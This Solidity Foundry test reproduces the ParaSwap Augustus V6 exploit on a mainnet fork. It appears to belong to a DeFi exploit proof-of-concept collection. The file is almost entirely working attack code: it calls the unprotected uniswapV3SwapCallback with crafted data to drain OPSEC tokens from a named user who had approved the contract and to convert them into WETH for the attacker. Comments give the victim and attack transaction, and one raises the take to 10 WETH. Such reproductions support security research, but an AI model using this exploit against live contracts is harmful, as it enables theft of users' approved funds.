// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$24K
// Whitehat : https://etherscan.io/address/0xfde0d1575ed8e06fbf36256bcdfa1f359281455a
// Whitehat Contract : https://etherscan.io/address/0x6980a47bee930a4584b09ee79ebe46484fbdbdd0
// Vuln Contract : https://etherscan.io/address/0x00000000fdac7708d0d360bddc1bc7d097f47439
// Attack txs : https://phalcon.blocksec.com/explorer/tx/eth/0x35a73969f582872c25c96c48d8bb31c23eab8a49c19282c67509b96186734e60

// @Analysis
// https://medium.com/neptune-mutual/analysis-of-the-paraswap-exploit-1f97c604b4fe

interface IParaSwapAugustusV6 {
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes memory data
    ) external;
}

contract ContractTest is Test {
    IERC20 private constant WETH =
        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant OPSEC =
        IERC20(0x6A7eFF1e2c355AD6eb91BEbB5ded49257F3FED98);
    IERC20 private constant wTAO =
        IERC20(0x77E06c9eCCf2E797fd462A92B6D7642EF85b0A44);
    IParaSwapAugustusV6 private constant AugustusV6 =
        IParaSwapAugustusV6(0x00000000FdAC7708D0D360BDDc1bc7d097F47439);
    // User who had provided approval for Augustus V6 contract
    // Amount of OPSEC will be transferred from this user
    address private constant from = 0x0cc396F558aAE5200bb0aBB23225aCcafCA31E27;

    function setUp() public {
        vm.createSelectFork("mainnet", 19470560);
        vm.label(address(WETH), "WETH");
        vm.label(address(OPSEC), "OPSEC");
        vm.label(address(wTAO), "wTAO");
        vm.label(address(AugustusV6), "AugustusV6");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter WETH balance before attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );

        emit log_named_decimal_uint(
            "Victim OPSEC balance before attack",
            OPSEC.balanceOf(from),
            OPSEC.decimals()
        );

        emit log_named_decimal_uint(
            "Victim approved OPSEC amount before attack",
            OPSEC.allowance(from, address(AugustusV6)),
            OPSEC.decimals()
        );

        // Amount0Delta negative value can be arbitrary up to 0
        int256 amount0Delta = 0;
        // In the attack tx 6_463_332_789_527_457_985 amount of WETH was transferred to the exploiter (frontran by whitehat)
        // Let's try more -> 10 WETH
        int256 amount1Delta = 10e18;
        address to = address(this);
        uint256 fee1 = 3_000;
        uint256 fee2 = 10_000;
        bytes32 encodedOPSECAddr = 0x8000000000000000000000006a7eff1e2c355ad6eb91bebb5ded49257f3fed98;
        bytes memory data = abi.encode(
            to,
            from,
            address(wTAO),
            address(WETH),
            fee1,
            encodedOPSECAddr,
            address(WETH),
            fee2
        );

        AugustusV6.uniswapV3SwapCallback(amount0Delta, amount1Delta, data);

        emit log_named_decimal_uint(
            "Victim OPSEC balance after attack",
            OPSEC.balanceOf(address(from)),
            OPSEC.decimals()
        );

        emit log_named_decimal_uint(
            "Victim approved OPSEC amount after attack",
            OPSEC.allowance(from, address(AugustusV6)),
            OPSEC.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );
    }
}
